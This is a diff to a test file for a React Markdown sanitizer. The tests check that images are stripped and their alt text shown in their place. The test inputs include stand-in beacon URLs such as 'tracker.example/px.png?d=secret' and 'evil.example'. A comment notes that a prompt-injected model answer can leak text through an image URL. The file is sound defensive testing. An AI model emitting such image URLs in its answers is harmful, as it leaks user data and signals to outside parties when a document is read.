@@ -96,17 +96,48 @@ describe("the sanitizing boundary, end to end", () => {
 
   it("neutralises a protocol-relative image", () => {
     const { container } = render(<Markdown>{"![x](//evil.example/pixel.png)"}</Markdown>);
-    const img = container.querySelector("img");
-    expect(img).not.toBeNull();
-    // React refuses to emit an empty `src` (it warns and omits the attribute), so the emptied URL
-    // shows up as ABSENT rather than as `src=""`. Either way no request is made — assert the
-    // effective value so this does not become a test of React's rendering choice.
-    expect(img?.getAttribute("src") ?? "").toBe("");
+    expect(container.querySelector("img")).toBeNull();
     expect(container.innerHTML).not.toContain("evil.example");
-    // The tripwire for the single most likely way this becomes live: today `img-src 'self' data:
-    // blob:` blocks the request anyway, so widening the CSP to render remote images would turn
-    // an `![](//attacker/px.png)` in any ingested document into a per-open read receipt and IP
-    // beacon. This assertion fails first if the URL guard is loosened alongside the CSP.
+    expect(container.textContent).toContain("[x]");
+  });
+
+  // Every image, not only a hostile-looking one: a remote image in an ingested document, an event or
+  // a model's answer is a read receipt and an IP beacon each time it is shown, and a prompt-injected
+  // answer can carry text out in its URL. Today the CSP (`img-src 'self' data: blob:`) refuses the
+  // request too; this fails first if the Markdown boundary ever starts relying on that alone.
+  it("never gives an image a source, and shows its alt text instead", () => {
+    for (const source of [
+      "![chart](https://tracker.example/px.png?d=secret)",
+      "![chart](http://tracker.example/px.png)",
+      "![chart](/same-origin.png)",
+      "![chart](./media/image1.png)",
+      "![chart](data:image/png;base64,iVBORw0KGgo=)",
+    ]) {
+      const { container, unmount } = render(<Markdown>{source}</Markdown>);
+      expect(container.querySelector("img"), source).toBeNull();
+      expect(container.querySelector("[src]"), source).toBeNull();
+      expect(container.innerHTML, source).not.toMatch(/tracker|same-origin|image1|base64/);
+      expect(container.textContent, source).toContain("[chart]");
+      unmount();
+    }
+  });
+
+  it("drops an image with no alt text without a trace", () => {
+    const { container } = render(
+      <Markdown>{"before ![](https://tracker.example/px.png) after"}</Markdown>,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.textContent).toBe("before  after");
+  });
+
+  it("keeps a link wrapped around an image, showing the image's alt text", () => {
+    const { container } = render(
+      <Markdown>{"[![badge](https://img.example/b.svg)](https://example.com/x)"}</Markdown>,
+    );
+    const a = container.querySelector("a");
+    expect(a?.getAttribute("href")).toBe("https://example.com/x");
+    expect(a?.textContent).toBe("[badge]");
+    expect(container.innerHTML).not.toContain("img.example");
   });
 
   it("drops a style attribute and a <style> block", () => {
